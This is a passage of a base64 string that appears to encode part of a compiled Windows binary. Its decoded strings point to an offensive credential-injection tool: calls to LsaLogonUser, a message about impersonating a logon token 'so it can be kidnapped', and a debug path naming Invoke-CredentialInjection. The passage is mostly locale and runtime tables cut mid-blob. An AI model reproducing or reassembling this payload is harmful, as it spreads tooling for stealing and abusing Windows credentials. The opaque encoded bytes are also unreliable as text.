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AAAAXgAAAHwAAAAmJgAAfHwAACo9AAArPQAALT0AAC89AAAlPQAAPj49ADw8PQAmPQAAfD0AAF49AABgdmZ0YWJsZScAAAAAAAAAYHZidGFibGUnAAAAAAAAAGB2Y2FsbCcAYHR5cGVvZicAAAAAAAAAAGBsb2NhbCBzdGF0aWMgZ3VhcmQnAAAAAGBzdHJpbmcnAAAAAAAAAABgdmJhc2UgZGVzdHJ1Y3RvcicAAAAAAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGBkZWZhdWx0IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAGB2aXJ0dWFsIGRpc3BsYWNlbWVudCBtYXAnAAAAAAAAYGVoIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAAAAAGBlaCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAYGVoIHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAAAAAYHVkdCByZXR1cm5pbmcnAGBFSABgUlRUSQAAAAAAAABgbG9jYWwgdmZ0YWJsZScAYGxvY2FsIHZmdGFibGUgY29uc3RydWN0b3IgY2xvc3VyZScAIG5ld1tdAAAAAAAAIGRlbGV0ZVtdAAAAAAAAAGBvbW5pIGNhbGxzaWcnAABgcGxhY2VtZW50IGRlbGV0ZSBjbG9zdXJlJwAAAAAAAGBwbGFjZW1lbnQgZGVsZXRlW10gY2xvc3VyZScAAAAAYG1hbmFnZWQgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBtYW5hZ2VkIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAYGR5bmFtaWMgaW5pdGlhbGl6ZXIgZm9yICcAAAAAAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAAAAAAAAYHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAGB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAAAAAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAGBsb2NhbCBzdGF0aWMgdGhyZWFkIGd1YXJkJwAAAAAAIFR5cGUgRGVzY3JpcHRvcicAAAAAAAAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoAAAAAAAgQmFzZSBDbGFzcyBBcnJheScAAAAAAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAAAAAAAABoCAhoCBgAAAEAOGgIaCgBQFBUVFRYWFhQUAADAwgFCAiAAIACgnOFBXgAAHADcwMFBQiAAAACAogIiAgAAAAGBoYGhoaAgIB3hwcHdwcAgIAAAIAAgABwgAAABTdW4ATW9uAFR1ZQBXZWQAVGh1AEZyaQBTYXQAU3VuZGF5AABNb25kYXkAAFR1ZXNkYXkAV2VkbmVzZGF5AAAAAAAAAFRodXJzZGF5AAAAAEZyaWRheQAAAAAAAFNhdHVyZGF5AAAAAEphbgBGZWIATWFyAEFwcgBNYXkASnVuAEp1bABBdWcAU2VwAE9jdABOb3YARGVjAAAAAABKYW51YXJ5AEZlYnJ1YXJ5AAAAAE1hcmNoAAAAQXByaWwAAABKdW5lAAAAAEp1bHkAAAAAQXVndXN0AAAAAAAAU2VwdGVtYmVyAAAAAAAAAE9jdG9iZXIATm92ZW1iZXIAAAAAAAAAAERlY2VtYmVyAAAAAEFNAABQTQAAAAAAAE1NL2RkL3l5AAAAAAAAAABkZGRkLCBNTU1NIGRkLCB5eXl5AAAAAABISDptbTpzcwAAAAAAAAAAUwB1AG4AAABNAG8AbgAAAFQAdQBlAAAAVwBlAGQAAABUAGgAdQAAAEYAcgBpAAAAUwBhAHQAAABTAHUAbgBkAGEAeQAAAAAATQBvAG4AZABhAHkAAAAAAFQAdQBlAHMAZABhAHkAAABXAGUAZABuAGUAcwBkAGEAeQAAAAAAAABUAGgAdQByAHMAZABhAHkAAAAAAAAAAABGAHIAaQBkAGEAeQAAAAAAUwBhAHQAdQByAGQAYQB5AAAAAAAAAAAASgBhAG4AAABGAGUAYgAAAE0AYQByAAAAQQBwAHIAAABNAGEAeQAAAEoAdQBuAAAASgB1AGwAAABBAHUAZwAAAFMAZQBwAAAATwBjAHQAAABOAG8AdgAAAEQAZQBjAAAASgBhAG4AdQBhAHIAeQAAAEYAZQBiAHIAdQBhAHIAeQAAAAAAAAAAAE0AYQByAGMAaAAAAAAAAABBAHAAcgBpAGwAAAAAAAAASgB1AG4AZQAAAAAAAAAAAEoAdQBsAHkAAAAAAAAAAABBAHUAZwB1AHMAdAAAAAAAUwBlAHAAdABlAG0AYgBlAHIAAAAAAAAATwBjAHQAbwBiAGUAcgAAAE4AbwB2AGUAbQBiAGUAcgAAAAAAAAAAAEQAZQBjAGUAbQBiAGUAcgAAAAAAQQBNAAAAAABQAE0AAAAAAAAAAABNAE0ALwBkAGQALwB5AHkAAAAAAAAAAABkAGQAZABkACwAIABNAE0ATQBNACAAZABkACwAIAB5AHkAeQB5AAAASABIADoAbQBtADoAcwBzAAAAAAAAAAAAVQBTAEUAUgAzADIALgBEAEwATAAAAAAATWVzc2FnZUJveFcAAAAAAEdldEFjdGl2ZVdpbmRvdwBHZXRMYXN0QWN0aXZlUG9wdXAAAAAAAABHZXRVc2VyT2JqZWN0SW5mb3JtYXRpb25XAAAAAAAAAEdldFByb2Nlc3NXaW5kb3dTdGF0aW9uAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAgACAAIAAoACgAKAAoACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEACEAIQAhACEAIQAhACEAIQAhACEABAAEAAQABAAEAAQABAAgQCBAIEAgQCBAIEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABABAAEAAQABAAEAAQAIIAggCCAIIAggCCAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAQABAAEAAQACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEBgQGBAYEBgQGBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQABAAEAAQABAAEACCAYIBggGCAYIBggECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBEAAQABAAEAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBARAAAQEBAQEBAQEBAQEBAQECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgEQAAIBAgECAQIBAgECAQIBAgEBAQAAAAAAAAAAAAAAAICBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlae3x9fn+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/wECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn8AMSNTTkFOAAAxI0lORAAAADEjSU5GAAAAMSNRTkFOAABDAE8ATgBPAFUAVAAkAAAAQQAAABcAAABnZW5lcmljAHVua25vd24gZXJyb3IAAABpb3N0cmVhbQAAAAAAAAAAaW9zdHJlYW0gc3RyZWFtIGVycm9yAAAAc3lzdGVtAABzdHJpbmcgdG9vIGxvbmcAaW52YWxpZCBzdHJpbmcgcG9zaXRpb24AXABcAC4AXABwAGkAcABlAFwAcwBxAHMAdgBjAAAAAABFcnJvciBjYWxsaW5nIExzYUNvbm5lY3RVbnRydXN0ZWQuIEVycm9yIGNvZGU6IABoTFNBIChMU0EgaGFuZGxlKSBpcyBOVUxMLCB0aGlzIHNob3VsZG4ndCBldmVyIGhhcHBlbi4AAE1JQ1JPU09GVF9BVVRIRU5USUNBVElPTl9QQUNLQUdFX1YxXzAAAABLZXJiZXJvcwAAAAAAAAAAUmVjZWl2ZWQgYW4gaW52YWxpZCBhdXRoIHBhY2thZ2UgZnJvbSB0aGUgbmFtZWQgcGlwZQAAAABDYWxsIHRvIExzYUxvb2t1cEF1dGhlbnRpY2F0aW9uUGFja2FnZSBmYWlsZWQuIEVycm9yIGNvZGU6IAAAAAAAQ2FsbCB0byBPcGVuUHJvY2Vzc1Rva2VuIGZhaWxlZC4gRXJyb3Jjb2RlOiAAAAAAQ2FsbCB0byBHZXRUb2tlbkluZm9ybWF0aW9uIGZhaWxlZC4AAAAAAEVycm9yIGNhbGxpbmcgTHNhTG9nb25Vc2VyLiBFcnJvciBjb2RlOiAAAAAAAAAAAAAAAAAAAAAATG9nb24gc3VjY2VlZGVkLCBpbXBlcnNvbmF0aW5nIHRoZSB0b2tlbiBzbyBpdCBjYW4gYmUga2lkbmFwcGVkIGFuZCBzdGFydGluZyBhbiBpbmZpbml0ZSBsb29wIHdpdGggdGhlIHRocmVhZC4AACVsdQAlZAAAJWxkAAAAAAAiBZMZBAAAAASOAQACAAAAJI4BAAgAAAB0jgEAIAAAAAAAAAABAAAAAAAAAAAAAABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACLABgAEAAAAAAAAAAAAAAAAAAAAAAAAAUlNEUw2V/cT8C+hPggQPjYC0npkBAAAAQzpcR2l0SHViXFBvd2VyU2hlbGxcSW52b2tlLUNyZWRlbnRpYWxJbmplY3Rpb25cTG9nb25Vc2VyXExvZ29uVXNlclx4NjRcUmVsZWFzZVxsb2dvbi5wZGIAAAAAAAAAoAAAAKAAAAAAAAAAAAAAAAjIAQAAAAAAAAAAAP////8AAAAAQAAAACCIAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAA4iAEAAAAAAAAAAAD4hwEAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAA4McBAHCIAQBIiAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIiIAQAAAAAAAAAAAKCIAQD4hwEAAAAAAAAAAAAAAAAAAAAAAODHAQABAAAAAAAAAP////8AAAAAQAAAAHCIAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAwyAEA8IgBAMiIAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAACIkBAAAAAAAAAAAAIIkBAPiHAQAAAAAAAAAAAAAAAAAAAAAAMMgBAAEAAAAAAAAA/////wAAAABAAAAA8IgBAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAFjIAQBwiQEASIkBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAACIiQEAAAAAAAAAAACoiQEAIIkBAPiHAQAAAAAAAAAAAAAAAAAAAAAAAAAAAFjIAQACAAAAAAAAAP////8AAAAAQAAAAHCJAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAyAEA+IkBANCJAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAEIoBAAAAAAAAAAAAMIoBACCJAQD4hwEAAAAAAAAAAAAAAAAAAAAAAAAAAACAyAEAAgAAAAAAAAD/////AAAAAEAAAAD4iQEAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAqMgBAICKAQBYigEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAJiKAQAAAAAAAAAAAKiKAQAAAAAAAAAAAAAAAACoyAE